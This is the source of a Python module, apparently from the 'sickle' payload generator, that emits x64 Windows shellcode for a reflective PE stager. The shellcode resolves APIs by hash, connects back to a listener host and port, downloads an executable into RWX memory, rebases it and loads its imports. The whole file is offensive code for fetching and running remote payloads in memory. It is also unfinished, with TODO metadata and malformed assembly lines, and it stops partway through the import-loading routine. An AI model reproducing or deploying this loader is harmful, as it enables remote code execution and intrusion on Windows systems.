import sys
import struct

from sickle.common.lib.reversing.assembler import Assembler
from sickle.common.lib.generic.mparser import argument_check
from sickle.common.lib.generic.convert import port_str_to_htons
from sickle.common.lib.generic.convert import from_str_to_xwords
from sickle.common.lib.generic.convert import ip_str_to_inet_addr
from sickle.common.lib.generic.convert import from_str_to_win_hash

class Shellcode():

    arch = "x64"

    platform = "windows"

    name = f"TODO"

    module = f"{platform}/{arch}/reflective_pe_tcp"

    example_run = f"{sys.argv[0]} -p {module} LHOST=192.168.81.144 LPORT=1337 -f c"

    ring = 3

    author = ["wetw0rk"]

    tested_platforms = ["TODO"]

    summary = ("TODO")

    description = """
    TODO
    """

    arguments = {}
    arguments["LHOST"] = {}
    arguments["LHOST"]["optional"] = "no"
    arguments["LHOST"]["description"] = "Listener host to receive the callback"

    arguments["LPORT"] = {}
    arguments["LPORT"]["optional"] = "yes"
    arguments["LPORT"]["description"] = "Listening port on listener host"

    def __init__(self, arg_object):

        self.arg_list = arg_object["positional arguments"]
        arg_object["architecture"] = Shellcode.arch
        self.builder = Assembler(Shellcode.arch)

        self.storage_offsets = {
            # ------ FUNCTIONS ------
            "CreateProcessA"    : 0x90,
            "GetCurrentProcess" : 0x88,
            "LoadLibraryA"      : 0x98,
            "WSAStartup"        : 0x70,
            "socket"            : 0x68,
            "connect"           : 0x60,
            "send"              : 0x58,
            "recv"              : 0x50,
            "malloc"            : 0x48,
            "realloc"           : 0x40,
            "memset"            : 0x38,
            "VirtualAllocEx"    : 0x30,
            "GetProcAddress"    : 0x150,
            "memcpy"            : 0x148,
            "VirtualProtect"    : 0x140,
            "CreateRemoteThread" : 0x160,
            "WaitForSingleObject" : 0x168,

            # ------ VARIABLES ------
            "index"                         : 0x90,
            "wsaData"                       : 0x200,
            "sockaddr_name"                 : 0x220,
            "sockfd"                        : 0x68,
            "buffer"                        : 0x60,
            "pResponse"                     : 0x70,
            "pTmpResponse"                  : 0x58,
            "bytesRead"                     : 0x78,
            "hProcess"                      : 0x88,
            "pNtHeader"                     : 0x50,
            "lpvLoadedAddress"              : 0x78,
            "lpvNewAllocatedBase"           : 0x78,
            "dwOffsetToBaseRelocationTable" : 0x90,
            "pHeaderSection"                : 0x28,
            "dwTableSize"                   : 0x38,
            "lpvPEBytes"                    : 0x70,
            "pBaseRelocationTable"          : 0x200,
            "dwBlockSize"                   : 0x90,
            "pwRelocEntry"                  : 0x220,
            "numEntries"                    : 0x218,
            "dwBlockIndex"                  : 0x210,
            "dwAddressOffset"               : 0x208,
            "lpvPreferableBase"             : 0x100,

            # 
            "dwImportsOffset"               : 0x38,
            "lpNtHeader"                    : 0x50,
            "lpvFileContent"                : 0x70,
            "lpImportData"                  : 0x220,
            "szDllName"                     : 0x90,
            "hLibraryHandle"                : 0x218,
            "dwFThunk"                      : 0x210,
            "lpApiImport"                   : 0x208,

            #
            "stWrittenBytes"                : 0x38,
            "lpAllocatedBase"               : 0x78,

            #
            "lpSectionHeaderArray"          : 0x210,

            "dwSectionMappedSize"           : 0x38,
            "dwSectionProtection"           : 0x90,
            "dwSecIndex"                    : 0x218,
        }

        self.static_variables = {
            "SOCK_BUFFER_SIZE"       : 0x1000,
            "MEM_COMMIT"             : 0x00001000,
            "MEM_RESERVE"            : 0x00002000,
            "PAGE_EXECUTE_READWRITE" : 0x40,
            "PAGE_EXECUTE_READ"      : 0x20,
            "PAGE_EXECUTE_WRITECOPY" : 0x80,
            "PAGE_READWRITE"         : 0x04,
            "IMAGE_REL_BASED_DIR64"  : 0x0A,
            "PAGE_EXECUTE"           : 0x10,
            "PAGE_READONLY"          : 0x02,
            "PAGE_WRITECOPY"         : 0x08,
            "PAGE_NOACCESS"          : 0x01,
            "IMAGE_SCN_MEM_EXECUTE"  : 0x20000000,
            "IMAGE_SCN_MEM_READ"     : 0x40000000,
            "IMAGE_SCN_MEM_WRITE"    : 0x80000000,
        }

        self.types = {
            "IMAGE_DIRECTORY_ENTRY_EXPORT"         : 0,   
            "IMAGE_DIRECTORY_ENTRY_IMPORT"         : 1, 
            "IMAGE_DIRECTORY_ENTRY_RESOURCE"       : 2, 
            "IMAGE_DIRECTORY_ENTRY_EXCEPTION"      : 3, 
            "IMAGE_DIRECTORY_ENTRY_SECURITY"       : 4, 
            "IMAGE_DIRECTORY_ENTRY_BASERELOC"      : 5,
            "IMAGE_DIRECTORY_ENTRY_DEBUG"          : 6,  
            "IMAGE_DIRECTORY_ENTRY_ARCHITECTURE"   : 7,  
            "IMAGE_DIRECTORY_ENTRY_GLOBALPTR"      : 8,   
            "IMAGE_DIRECTORY_ENTRY_TLS"            : 9,   
            "IMAGE_DIRECTORY_ENTRY_LOAD_CONFIG"    : 10, 
            "IMAGE_DIRECTORY_ENTRY_BOUND_IMPORT"   : 11,  
            "IMAGE_DIRECTORY_ENTRY_IAT"            : 12, 
            "IMAGE_DIRECTORY_ENTRY_DELAY_IMPORT"   : 13,  
            "IMAGE_DIRECTORY_ENTRY_COM_DESCRIPTOR" : 14,  
        }

        self.struct_def_IMAGE_DOS_HEADER = {
            "e_magic"    : 0x00, 
            "e_cblp"     : 0x02, 
            "e_cp"       : 0x04, 
            "e_crlc"     : 0x06, 
            "e_cparhdr"  : 0x08,
            "e_minalloc" : 0x0A, 
            "e_maxalloc" : 0x0C,
            "e_ss"       : 0x0E, 
            "e_sp"       : 0x10, 
            "e_csum"     : 0x12, 
            "e_ip"       : 0x14, 
            "e_cs"       : 0x16, 
            "e_lfarlc"   : 0x18, 
            "e_ovno"     : 0x1A, 
            "e_res[4]"   : 0x1C, 
            "e_oemid"    : 0x24, 
            "e_oeminfo"  : 0x26, 
            "e_res2[10]" : 0x28, 
            "e_lfanew"   : 0x3C, 
        }

        self.struct_def_IMAGE_NT_HEADERS = {
            "Signature"      : 0x00, 
            "FileHeader"     : 0x04,
            "OptionalHeader" : 0x18,
        }

        self.struct_def_IMAGE_FILE_HEADER = {
            "Machine"              : 0x000,
            "NumberOfSections"     : 0x002,
            "TimeDateStamp"        : 0x004,
            "PointerToSymbolTable" : 0x008,
            "NumberOfSymbols"      : 0x00c,
            "SizeOfOptionalHeader" : 0x010,
            "Characteristics"      : 0x012,
        }

        self.struct_def_IMAGE_OPTIONAL_HEADER = {
            "Magic"                       : 0x00,
            "MajorLinkerVersion"          : 0x02, 
            "MinorLinkerVersion"          : 0x03, 
            "SizeOfCode"                  : 0x04, 
            "SizeOfInitializedData"       : 0x08,
            "SizeOfUninitializedData"     : 0x0C, 
            "AddressOfEntryPoint"         : 0x10, 
            "BaseOfCode"                  : 0x14, 
            "BaseOfData"                  : 0x18,
            "ImageBase"                   : 0x18, 
            "SectionAlignment"            : 0x20, 
            "FileAlignment"               : 0x24, 
            "MajorOperatingSystemVersion" : 0x28, 
            "MinorOperatingSystemVersion" : 0x2a, 
            "MajorImageVersion"           : 0x2c,
            "MinorImageVersion"           : 0x2e, 
            "MajorSubsystemVersion"       : 0x30, 
            "MinorSubsystemVersion"       : 0x32,
            "Win32VersionValue"           : 0x34, 
            "SizeOfImage"                 : 0x38, 
            "SizeOfHeaders"               : 0x3c, 
            "CheckSum"                    : 0x40, 
            "Subsystem"                   : 0x44, 
            "DllCharacteristics"          : 0x46, 
            "SizeOfStackReserve"          : 0x48, 
            "SizeOfStackCommit"           : 0x50, 
            "SizeOfHeapReserve"           : 0x58, 
            "SizeOfHeapCommit"            : 0x60, 
            "LoaderFlags"                 : 0x68, 
            "NumberOfRvaAndSizes"         : 0x6c, 
            "DataDirectory[16]"           : 0x70, 
        }

        self.struct_def_IMAGE_SECTION_HEADER = { 
            "Name[IMAGE_SIZEOF_SHORT_NAME]" : 0x00,
            "VirtualSize"                   : 0x08,
            "VirtualAddress"                : 0x0C,
            "SizeOfRawData"                 : 0x10,
            "PointerToRawData"              : 0x14,
            "PointerToRelocations"          : 0x18,
            "PointerToLinenumbers"          : 0x1C,
            "NumberOfRelocations"           : 0x20,
            "NumberOfLinenumbers"           : 0x22,
            "Characteristics"               : 0x24,
        }

        self.struct_def_IMAGE_DATA_DIRECTORY = {
            "VirtualAddress" : 0x00,
            "Size"           : 0x04,
        }

        self.struct_def_IMAGE_BASE_RELOCATION = {
            "VirtualAddress" : 0x00,
            "SizeOfBlock"    : 0x04,
        }

        self.struct_def_IMAGE_IMPORT_DESCRIPTOR = {
        # union {
            "Characteristics"    : 0x00,
            "OriginalFirstThunk" : 0x00,
        # };
            "TimeDateStamp"      : 0x04,
            "ForwarderChain"     : 0x08,
            "Name"               : 0x0C,
            "FirstThunk"         : 0x10,
        }

        self.struct_def_IMAGE_THUNK_DATA = {
        # union {
            "ForwarderString"  : 0x00,
            "Function"         : 0x00,
            "Ordinal"          : 0x00,
            "AddressOfData"    : 0x00,
        # } u1;
        }

        self.struct_def_IMAGE_IMPORT_BY_NAME = {
            "Hint" : 0x00,
            "Name" : 0x02,
        }

        return

    def get_kernel32(self):
        """Generates stub for obtaining the base address of Kernel32.dll
        """

        stub = """
; DWORD64 getKernel32()
; {
;	 CHAR c = 'K';
;	 PPEB pPEB = (PPEB)__readgsqword(0x60);
;	 PPEB_LDR_DATA pLdrData = (PLDR_DATA_TABLE_ENTRY)pPEB->Ldr;
;	 DWORD64 pHeadEntry = ((DWORD64)((PLDR_DATA_TABLE_ENTRY)pPEB->Ldr->InInitializationOrderModuleList.Flink));
;
;	 PLIST_ENTRY pEntry = ((PLIST_ENTRY)pHeadEntry)->Flink;
;	 while (1) {
;		 PLDR_DATA_TABLE_ENTRY pLdrDataTableEntry = (PLDR_DATA_TABLE_ENTRY)((DWORD64)pEntry - 0x10);
;		 if (((CHAR*)(pLdrDataTableEntry->FullDllName.Buffer[0]) == c) && ((CHAR*)(pLdrDataTableEntry->FullDllName.Buffer[13]) == '\0')) {
;			 return pLdrDataTableEntry->InInitializationOrderLinks.Flink;
;		 }
;
;		 pEntry = pEntry->Flink;
;	 }
; }

getKernel32:
    mov dl, 0x4b
getPEB:
    mov rcx, 0x60
    mov r8, gs:[rcx]
getHeadEntry:
    mov rdi, [r8 + 0x18]
    mov rdi, [rdi + 0x30]
search:
    xor rcx, rcx
    mov rax, [rdi + 0x10]
    mov rsi, [rdi + 0x40]
    mov rdi, [rdi]
    cmp [rsi + 0x18], cx
    jne search
    cmp [rsi], dl
    jne search
    ret
        """

        return stub

    def lookup_function(self):
        """Generates the stub responsible for obtaining the base address of a function in order to
        properly leverage this function, RDI must contain the base address of a module.
        """

        stub = """
; UINT hashAlgorithm(char* functionName)
; {
;	 DWORD hash = 0x00;
;	 DWORD rorByte = 0x0D;
;	 for (int i = 0; i < (strlen(functionName)); i++)
;	 {
;		 hash += (UINT16)functionName[i] & 0xFFFFFFFF;
;		 if (i < (strlen(functionName) - 1)) {
;			 hash = ((hash >> rorByte) | (hash << (32 - rorByte))) & 0xFFFFFFFF;
;		 }
;	 }
;	 return hash;
; }
;
; void lookupFunction(LPVOID moduleBase, UINT functionHash) {
;	 PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)moduleBase;
;	 PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((BYTE*)moduleBase + dosHeader->e_lfanew);
;	 IMAGE_EXPORT_DIRECTORY* exportDirectory = (IMAGE_EXPORT_DIRECTORY*)((BYTE*)moduleBase + ntHeaders->OptionalHeader.DataDirectory[0].VirtualAddress);
;	 DWORD* addressOfNames = (DWORD*)((BYTE*)moduleBase + exportDirectory->AddressOfNames);
;	 DWORD numberOfNames = exportDirectory->NumberOfNames;
;
;	 DWORD i = numberOfNames;
;	 while (i-- != 0) {
;		 char* functionNameFromModule = (char*)((BYTE*)moduleBase + addressOfNames[i]);
;		 if (hashAlgorithm(functionNameFromModule) == functionHash) {
;			 DWORD* addressOfFunctions = (DWORD*)((BYTE*)moduleBase + exportDirectory->AddressOfFunctions);
;			 DWORD* addressOfNameOrdinals = (DWORD*)((BYTE*)moduleBase + exportDirectory->AddressOfNameOrdinals);
;			 WORD ordinal = ((WORD*)((BYTE*)moduleBase + exportDirectory->AddressOfNameOrdinals))[i];
;			 return (LPVOID)((BYTE*)moduleBase + addressOfFunctions[ordinal]);
;		 }
;	 }
; }

lookupFunction:
    mov ebx, [rdi + 0x3c]
    add rbx, 0x88
    add rbx, rdi
    mov eax, [rbx]
    mov rbx, rdi
    add rbx, rax
    mov eax, [rbx + 0x20]
    mov r8, rdi
    add r8, rax
    mov rcx, [rbx + 0x18]
parseNames:
    jecxz error
    dec ecx
    mov eax, [r8 + rcx * 4]
    mov rsi, rdi
    add rsi, rax
    xor r9, r9
    xor rax, rax
    cld
calcHash:
    lodsb
    test al, al
    jz calcDone
    ror r9d, 0xD
    add r9, rax
    jmp calcHash
calcDone:
    cmp r9d, edx
    jnz parseNames
findAddress:
    mov r8d, [rbx + 0x24]
    add r8, rdi
    xor rax, rax
    mov ax, [r8 + rcx * 2]
    mov r8d, [rbx + 0x1c]
    add r8, rdi
    mov eax, [r8 + rax * 4]
    add rax, rdi
found:

error:
    ret
        """

        return stub

    def load_library(self, lib):
        """Generates the stub to load a library not currently loaded into a process
        """

        lists = from_str_to_xwords(lib)
        write_index = 0x100

        src = "\nload_library_{}:\n".format(lib.rstrip(".dll"))
        for i in range(len(lists["QWORD_LIST"])):
            src += "    mov rcx, 0x{}\n".format( struct.pack('<Q', lists["QWORD_LIST"][i]).hex() )
            src += "    mov [r15+{}], rcx\n".format(hex(write_index))
            write_index += 8

        for i in range(len(lists["DWORD_LIST"])):
            src += "    mov ecx, dword 0x{}\n".format( struct.pack('<L', lists["DWORD_LIST"][i]).hex() ) 
            src += "    mov [r15+{}], ecx\n".format(hex(write_index))
            write_index += 4

        for i in range(len(lists["WORD_LIST"])):
            src += "    mov cx, 0x{}\n".format( struct.pack('<H', lists["WORD_LIST"][i]).hex() )
            src += "    mov [r15+{}], cx\n".format(hex(write_index))
            write_index += 2

        for i in range(len(lists["BYTE_LIST"])):
            src += "    mov cl, 0x{}\n".format( hex(lists["BYTE_LIST"][i]) )
            src += "    mov [r15+{}], cl\n".format(hex(write_index))
            write_index += 1

        # Ensure that the string is NULL terminated
        src += """
    xor rcx, rcx
    mov [r15 + {}], cl
        """.format(hex(write_index))

        src += f"""
    lea rcx, [r15 + 0x100]
    mov rax, [r15 + {self.storage_offsets['LoadLibraryA']}]
    call rax
        """

        return src

    def resolve_functions(self):
        """This function is responsible for loading all libraries and resolving respective functions
        """

        stub = f"""
get_CreateProcessA:
    mov edx, {from_str_to_win_hash('CreateProcessA')}
    call lookupFunction
    mov [r15 + {self.storage_offsets['CreateProcessA']}], rax

get_GetCurrentProcess:
    mov edx, {from_str_to_win_hash('GetCurrentProcess')}
    call lookupFunction
    mov [r15 + {self.storage_offsets['GetCurrentProcess']}], rax

get_LoadLibraryA:
    mov edx, {from_str_to_win_hash('LoadLibraryA')}
    call lookupFunction
    mov [r15 + {self.storage_offsets['LoadLibraryA']}, rax

get_VirtualAllocEx:
    mov edx, {from_str_to_win_hash('VirtualAllocEx')}
    call lookupFunction
    mov [r15 + {self.storage_offsets['VirtualAllocEx']}, rax

get_GetProcAddress:
    mov edx, {from_str_to_win_hash('GetProcAddress')}
    call lookupFunction
    mov [r15 + {self.storage_offsets['GetProcAddress']}, rax

get_VirtualProtect:
    mov edx, {from_str_to_win_hash('VirtualProtect')}
    call lookupFunction
    mov [r15 + {self.storage_offsets['VirtualProtect']}, rax

get_CreateRemoteThread:
    mov edx, {from_str_to_win_hash('CreateRemoteThread')}
    call lookupFunction
    mov [r15 + {self.storage_offsets['CreateRemoteThread']}, rax

get_WaitForSingleObject:
    mov edx, {from_str_to_win_hash('WaitForSingleObject')}
    call lookupFunction
    mov [r15 + {self.storage_offsets['WaitForSingleObject']}, rax
        """

        stub += self.load_library("ws2_32.dll")
        stub += """
    mov rdi, rax
        """

        stub += f"""
get_WSAStartup:
    mov edx, {from_str_to_win_hash('WSAStartup')}
    call lookupFunction
    mov [r15 + {self.storage_offsets['WSAStartup']}], rax
get_socket:
    mov edx, {from_str_to_win_hash('socket')}
    call lookupFunction
    mov [r15 + {self.storage_offsets['socket']}], rax
get_connect:
    mov edx, {from_str_to_win_hash('connect')}
    call lookupFunction
    mov [r15 + {self.storage_offsets['connect']}], rax
get_send:
    mov edx, {from_str_to_win_hash('send')}
    call lookupFunction
    mov [r15 + {self.storage_offsets['send']}], rax
get_recv:
    mov edx, {from_str_to_win_hash('recv')}
    call lookupFunction
    mov [r15 + {self.storage_offsets['recv']}], rax
        """

        stub += self.load_library("msvcrt.dll")
        stub += """
    mov rdi, rax
        """

        stub += f"""
get_malloc:
    mov edx, {from_str_to_win_hash('malloc')}
    call lookupFunction
    mov [r15 + {self.storage_offsets['malloc']}], rax
get_realloc:
    mov edx, {from_str_to_win_hash('realloc')}
    call lookupFunction
    mov [r15 + {self.storage_offsets['realloc']}], rax
get_memset:
    mov edx, {from_str_to_win_hash('memset')}
    call lookupFunction
    mov [r15 + {self.storage_offsets['memset']}], rax
get_memcpy:
    mov edx, {from_str_to_win_hash('memcpy')}
    call lookupFunction
    mov [r15 + {self.storage_offsets['memcpy']}], rax
        """

        return stub

    def download_pe(self):
        """Stager responsible for downloading the PE into memory
        """

        argv_dict = argument_check(Shellcode.arguments, self.arg_list)
        if (argv_dict == None):
            exit(-1)

        if ("LPORT" not in argv_dict.keys()):
            lport = 4444
        else:
            lport = int(argv_dict["LPORT"])

        stub = f"""
call_WSAStartup:
    mov rcx, 0x202
    lea rdx, [r15 + {self.storage_offsets['wsaData']}]
    mov rax, [r15 + {self.storage_offsets['WSAStartup']}]
    call rax

call_socket:
    mov rcx, 0x02
    mov rdx, 0x01
    mov r8, 0x00
    mov rax, [r15 + {self.storage_offsets['socket']}]
    call rax
    mov [r15 + {self.storage_offsets['sockfd']}], rax

call_connect:
    mov rcx, rax
    mov r8, 0x10
    lea rdx, [r15 + {self.storage_offsets['sockaddr_name']}]
    mov r9, {hex(ip_str_to_inet_addr(argv_dict['LHOST']))}{struct.pack('<H', lport).hex()}0002
    mov [rdx], r9
    xor r9, r9
    mov [rdx + 0x08], r9
    mov rax, [r15 + {self.storage_offsets['connect']}]
    call rax

call_send:
    mov dword ptr [r15 + {self.storage_offsets['buffer']}], 0x41414141
    mov rcx, [r15 + {self.storage_offsets['sockfd']}]
    lea rdx, [r15 + {self.storage_offsets['buffer']}]
    mov r8, 0x4
    mov r9, 0x00
    mov rax, [r15 + {self.storage_offsets['send']}]
    call rax

allocate_main_buffer:
    mov rcx, {self.static_variables['SOCK_BUFFER_SIZE']}
    mov rax, [r15 + {self.storage_offsets['malloc']}]
    call rax
    mov [r15 + {self.storage_offsets['pResponse']}], rax
        
allocate_tmp_buffer:
    mov rcx, {self.static_variables['SOCK_BUFFER_SIZE']}
    mov rax, [r15 + {self.storage_offsets['malloc']}]
    call rax
    mov [r15 + {self.storage_offsets['pTmpResponse']}], rax

init_index:
    xor rax, rax
    mov [r15 + {self.storage_offsets['index']}], rax

download_stager:
    nop

call_memset:
    mov rcx, [r15 + {self.storage_offsets['pTmpResponse']}]
    xor rdx, rdx
    mov r8, {self.static_variables['SOCK_BUFFER_SIZE']}
    mov rax, [r15 + {self.storage_offsets['memset']}]
    call rax

call_recv:
    mov rcx, [r15 + {self.storage_offsets['sockfd']}]
    mov rdx, [r15 + {self.storage_offsets['pTmpResponse']}]
    mov r8, {self.static_variables['SOCK_BUFFER_SIZE']}
    xor r9, r9
    mov rax, [r15 + {self.storage_offsets['recv']}]
    call rax
    mov [r15 + {self.storage_offsets['bytesRead']}], rax

check_write:
    test rax, rax
    jle download_complete

    mov r10, [r15 + {self.storage_offsets['index']}]
    mov rcx, [r15 + {self.storage_offsets['bytesRead']}]
    mov rbx, [r15 + {self.storage_offsets['pResponse']}]
    mov rax, [r15 + {self.storage_offsets['pTmpResponse']}]
    add rbx, r10
write_data:
    mov dl, [rax]
    mov [rbx], dl
    inc r10
    inc rbx
    inc rax
    dec rcx
    mov [r15 + {self.storage_offsets['index']}], r10
    test rcx, rcx
    jnz write_data

check_realloc:
    mov rcx, [r15 + {self.storage_offsets['bytesRead']}]
    test rcx, rcx
    jle download_complete

realloc:
    mov rax, [r15 + {self.storage_offsets['realloc']}]
    mov rcx, [r15 + {self.storage_offsets['pResponse']}]
    mov rdx, [r15 + {self.storage_offsets['index']}]
    add rdx, {self.static_variables['SOCK_BUFFER_SIZE']}
    call rax
    mov [r15 + {self.storage_offsets['pResponse']}], rax
    jmp download_stager

download_complete:
    nop
        """

        return stub

    def alloc_image_space(self):
        """Create the allocation where the PE will loaded
        """

        stub = f"""

call_GetCurrentProcess:
    mov rax, [r15 + {self.storage_offsets['GetCurrentProcess']}]
    call rax
    mov [r15 + {self.storage_offsets['hProcess']}], rax

alloc_pe_home:
    mov rcx, [r15 + {self.storage_offsets['hProcess']}]
    xor rdx, rdx

    mov r8, [r15 + {self.storage_offsets['pResponse']}]                    
    mov dx, [r8 + {self.struct_def_IMAGE_DOS_HEADER['e_lfanew']}]        

    mov r8, [r15 + {self.storage_offsets['pResponse']}] 
    add r8, rdx                                                       
    mov [r15 + {self.storage_offsets['pNtHeader']}], r8

    add r8, {self.struct_def_IMAGE_NT_HEADERS["OptionalHeader"]}
    xor rdx, rdx
    mov dx, [r8 + {self.struct_def_IMAGE_OPTIONAL_HEADER["SizeOfImage"]}]  
    mov r8, rdx

    mov r9, {self.static_variables['PAGE_EXECUTE_READWRITE']}
    mov [rsp + 0x20], r9

    xor r9, r9
    add r9, {self.static_variables['MEM_COMMIT'] + self.static_variables['MEM_RESERVE']}
    
    xor rdx, rdx

    mov rax, [r15 + {self.storage_offsets['VirtualAllocEx']}]
    call rax
    mov [r15 + {self.storage_offsets['lpvLoadedAddress']}], rax
        """

        return stub

    def rva_to_offset(self):
        """TODO
        """

        stub = f"""
rva2offset:
    xor r9, r9
    mov r8, rcx
    add r8, {self.struct_def_IMAGE_NT_HEADERS['FileHeader']}
    mov r9w, [r8 + {self.struct_def_IMAGE_FILE_HEADER['NumberOfSections']}]

    add rcx, 0x108
    mov [r15 + {self.storage_offsets['pHeaderSection']}], rcx

    xor rdi, rdi
loop:
    mov rcx, [r15 + {self.storage_offsets['pHeaderSection']}]
    xor rax, rax
    xor rbx, rbx


    mov rax, 0x28 
    mul rdi

    add rcx, rax 
    mov r8, rcx 
    mov r12, r8  

    add rcx, {self.struct_def_IMAGE_SECTION_HEADER['VirtualAddress']}
    add r8, {self.struct_def_IMAGE_SECTION_HEADER['VirtualSize']}

    mov ax, [rcx]
    cmp r11, rax
    jge in_range
    jmp not_in_range
in_range:
    mov bx, [r8]
    add rbx, rax
    cmp r11, rbx
    jl calc_offset

not_in_range:
    inc rdi
    cmp rdi, r9
    jl loop

    jmp calc_offset

next_entry:
    jmp loop

calc_offset:
    add r12, {self.struct_def_IMAGE_SECTION_HEADER['PointerToRawData']}
    mov r12, [r12]
    add r12, r11

    sub r12, rax 
    mov rax, r12
    ret
        """

        return stub

    def rebase_pe(self):
        """TODO
        """

        stub = f"""
change_ImageBase:
    mov r8, [r15 + {self.storage_offsets['pNtHeader']}]
    add r8, {self.struct_def_IMAGE_NT_HEADERS["OptionalHeader"]}
    mov rcx, [r15 + {self.storage_offsets["lpvNewAllocatedBase"]}]

    mov rdx, [r8 + {self.struct_def_IMAGE_OPTIONAL_HEADER["ImageBase"]}]
    mov [r15 + {self.storage_offsets["lpvPreferableBase"]}], rdx

    mov [r8 + {self.struct_def_IMAGE_OPTIONAL_HEADER["ImageBase"]}], rcx

get_dwOffsetToBaseRelocationTable:
    xor rdx, rdx
    mov rdx, [r15 + {self.storage_offsets['pNtHeader']}]
    add rdx, {self.struct_def_IMAGE_NT_HEADERS['OptionalHeader']}
    add rdx, {self.struct_def_IMAGE_OPTIONAL_HEADER['DataDirectory[16]']}
    mov rax, {self.types['IMAGE_DIRECTORY_ENTRY_BASERELOC']}
    imul rax, 0x08
    add rdx, rax

    xor rax, rax
    mov ax, [rdx]
    mov r11, rax
    mov rcx, [r15 + {self.storage_offsets['pNtHeader']}]
    call rva2offset
    mov [r15 + {self.storage_offsets['dwOffsetToBaseRelocationTable']}], rax

get_dwTableSize:
    mov rdx, [r15 + {self.storage_offsets['pNtHeader']}]
    add rdx, {self.struct_def_IMAGE_NT_HEADERS['OptionalHeader']}
    add rdx, {self.struct_def_IMAGE_OPTIONAL_HEADER['DataDirectory[16]']}
    mov rax, {self.types['IMAGE_DIRECTORY_ENTRY_BASERELOC']}
    imul rax, 0x08
    add rdx, rax

    xor rcx, rcx
    mov cx, [rdx + 0x4]
    mov [r15 + {self.storage_offsets['dwTableSize']}], rcx

get_pBaseRelocationTable:
    mov rcx, [r15 + {self.storage_offsets['dwOffsetToBaseRelocationTable']}]
    mov rdx, [r15 + {self.storage_offsets['lpvPEBytes']}]
    add rdx, rcx 
    mov [r15 + {self.storage_offsets['pBaseRelocationTable']}], rdx

parse_table:
    nop

get_dwBlockSize:
    xor rcx, rcx
    mov rdx, [r15 + {self.storage_offsets['pBaseRelocationTable']}]
    add rdx, {self.struct_def_IMAGE_BASE_RELOCATION['SizeOfBlock']}
    mov cx, [rdx]
    mov [r15 + {self.storage_offsets['dwBlockSize']}], rcx

get_pwRelocEntry:
    mov rdx, [r15 + {self.storage_offsets['pBaseRelocationTable']}]
    add rdx, 0x08 
    mov [r15 + {self.storage_offsets['pwRelocEntry']}], rdx

get_numEntries:
    mov rax, [r15 + {self.storage_offsets['dwBlockSize']}]
    sub rax, 0x08
    shr rax, 1 
    imul rax, 0x02 
    mov [r15 + {self.storage_offsets['numEntries']}], rax

    xor rax, rax
process_entries:
    mov [r15 + {self.storage_offsets['dwBlockIndex']}], rax

get_wBlockType:
    xor rcx, rcx
    xor rbx, rbx
    mov rax, [r15 + {self.storage_offsets['dwBlockIndex']}] ; added
    mov rdx, [r15 + {self.storage_offsets['pwRelocEntry']}]

    add rdx, rax  
    mov cx, [rdx]   
    mov bx, cx   
    shr rcx, 0x0C  
    and bx, 0x0fff 

    cmp rcx, {self.static_variables['IMAGE_REL_BASED_DIR64']}
    jne init_next_entry
    nop

    xor rax, rax
    mov rcx, [r15 + {self.storage_offsets['pNtHeader']}]
    mov r11, [r15 + {self.storage_offsets['pBaseRelocationTable']}]
    mov ax, [r11] 
    add rax, rbx
    mov r11, rax
    call rva2offset
    mov r12, [r15 + {self.storage_offsets['lpvNewAllocatedBase']}]
    mov rbx, [r15 + {self.storage_offsets['lpvPreferableBase']}]
    mov rcx, [r15 + {self.storage_offsets['lpvPEBytes']}]
    add rcx, rax
    mov rax, rcx   
    mov rcx, [rcx] 
    sub [rax], rbx 
    add [rax], r12 
    nop

init_next_entry:
    mov rax, [r15 + {self.storage_offsets['dwBlockIndex']}]
    add rax, 0x2
    mov [r15 + {self.storage_offsets['dwBlockIndex']}], rax
    mov rcx, [r15 + {self.storage_offsets['numEntries']}] 
    cmp rax, rcx
    jl process_entries

no_reloc:
    mov rdx, [r15 + {self.storage_offsets['pBaseRelocationTable']}]
    mov rcx, [r15 + {self.storage_offsets['dwBlockSize']}]
    add rdx, rcx
    mov [r15 + {self.storage_offsets['pBaseRelocationTable']}], rdx

    mov rdx, [r15 + {self.storage_offsets['dwTableSize']}]
    sub rdx, rcx
    mov [r15 + {self.storage_offsets['dwTableSize']}], rdx 

    cmp rdx, 0
    jg get_dwBlockSize

rebase_done:
    nop
        """

        return stub

    def load_imports(self):
        """Load imports
        """

        stub = f"""
get_dwImportsOffset:
    xor r11, r11
    mov rdx, [r15 + {self.storage_offsets['lpNtHeader']}]
    add rdx, {self.struct_def_IMAGE_NT_HEADERS['OptionalHeader']}
    add rdx, {self.struct_def_IMAGE_OPTIONAL_HEADER['DataDirectory[16]']}
    mov rax, {self.types['IMAGE_DIRECTORY_ENTRY_IMPORT']}
    imul rax, 0x08
    add rdx, rax
    xor rax, rax
    mov ax, [rdx] 
    mov r11, rax
    mov rcx, [r15 + {self.storage_offsets['lpNtHeader']}]
    call rva2offset
    mov [r15 + {self.storage_offsets['dwImportsOffset']}], rax

get_lpImportData:
    mov rdx, [r15 + {self.storage_offsets['lpvFileContent']}]
    add rdx, rax
    mov [r15 + {self.storage_offsets['lpImportData']}], rdx


parse_imports:
    mov rdx, [r15 + {self.storage_offsets['lpImportData']}]

get_szDllName:
    xor r11, r11
    add rdx, {self.struct_def_IMAGE_IMPORT_DESCRIPTOR['Name']}
    mov r11d, [rdx]
    mov rcx, [r15 + {self.storage_offsets['lpNtHeader']}]
    call rva2offset
    mov rdx, [r15 + {self.storage_offsets['lpvFileContent']}]

get_hLibraryHandle:
    add rdx, rax 
    mov rcx, rdx
    mov rax, [r15 + {self.storage_offsets['LoadLibraryA']}]
    call rax
    mov [r15 + {self.storage_offsets['hLibraryHandle']}], rax

get_dwFThunk:
    xor r11, r11
    mov rdx, [r15 + {self.storage_offsets['lpImportData']}]
    add rdx, {self.struct_def_IMAGE_IMPORT_DESCRIPTOR['FirstThunk']}
    mov r11d, [rdx]
    mov rcx, [r15 + {self.storage_offsets['lpNtHeader']}]
    call rva2offset
    mov rdx, [r15 + {self.storage_offsets['lpvFileContent']}]
    add rdx, rax
    mov [r15 + {self.storage_offsets['dwFThunk']}], rdx

get_lpApiImport:
    mov rdx, [r15 + {self.storage_offsets['dwFThunk']}]
    add rdx, {self.struct_def_IMAGE_THUNK_DATA['AddressOfData']}
    mov r11, [rdx]
    mov rcx, [r15 + {self.storage_offsets['lpNtHeader']}]
    call rva2offset
    mov rdx, [r15 + {self.storage_offsets['lpvFileContent']}]
    add rdx, rax 
    mov [r15 + {self.storage_offsets['lpApiImport']}], rdx

get_lpApiAddress:
    add rdx, {self.struct_def_IMAGE_IMPORT_BY_NAME['Name']} 
